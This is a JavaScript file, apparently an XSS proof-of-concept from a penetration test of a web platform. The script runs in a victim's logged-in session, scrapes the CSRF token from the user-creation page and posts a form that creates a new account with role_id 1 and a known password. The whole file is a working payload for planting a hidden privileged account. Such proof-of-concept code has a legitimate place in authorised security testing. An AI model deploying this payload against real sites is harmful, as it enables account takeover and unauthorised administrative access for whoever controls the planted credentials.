function getTokenAndCreateuser() {
  const path = "http://localhost/BPC_PlataformaOperacional/public/user/create"; // Solo el path, ya que se ejecuta desde la misma página
  // Realizamos la solicitud GET
  fetch(path, {
    method: "GET",
    credentials: "same-origin",
  })
    .then((response) => response.text()) // Obtener la respuesta como texto (HTML)
    .then((html) => {
      // Crear un DOM parser para analizar el HTML
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, "text/html");
      // Buscar el valor de _token en el formulario
      const tokenInput = doc.querySelector('input[name="_token"]');
      if (tokenInput) {
        const token = tokenInput.value;
        console.log("Token obtenido:", token);
        // Llamar a la función de creación de usuario con el _token obtenido
        createUser(token);
      } else {
        console.error("No se encontró el token en el formulario");
      }
    })
    .catch((error) => {
      console.error("Error en la solicitud GET:", error);
    });
}

function createUser(_token) {
    const path = 'http://localhost/BPC_PlataformaOperacional/public/user/create'; // Solo el path, ya que se ejecuta desde la misma página

    const formData = {
        _token: _token, // Usamos el _token obtenido
        role_id: 1,
        status: 'Active',
        first_name: 'Fran XSS',
        last_name: 'Hackmetrix',
        rut_completo: '5671151-1',
        empresa: [534],
        birthday: '1995-11-19',
        phone: '',
        address: 'test',
        country_id: 152,
        id_empresa_defecto: '534',
        email: 'franciscoxss@hackmetrix.com',
        username: 'franXSS2test2',
        password: 'Testing123!!',
        password_confirmation: 'Testing123!!',
        proengsoft_jsvalidation: ''
    };

    const boundary = '---------------------------13482091994990646204261126829';
    let body = '';

    // Construir el cuerpo multipart/form-data
    for (let key in formData) {
        let value = formData[key];
        if (Array.isArray(value)) {
            value.forEach((item) => {
                body += `--${boundary}\r\n`;
                body += `Content-Disposition: form-data; name="${key}[]"\r\n\r\n`;
                body += `${item}\r\n`;
            });
        } else {
            body += `--${boundary}\r\n`;
            body += `Content-Disposition: form-data; name="${key}"\r\n\r\n`;
            body += `${value}\r\n`;
        }
    }

    // Final del cuerpo multipart
    body += `--${boundary}--\r\n`;

    // Realizamos la solicitud POST
    fetch(path, {
        method: 'POST',
        headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
        },
        body: body,
        credentials: 'same-origin' // Asegura que las cookies se envíen con esta solicitud
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });
}

getTokenAndCreateuser();
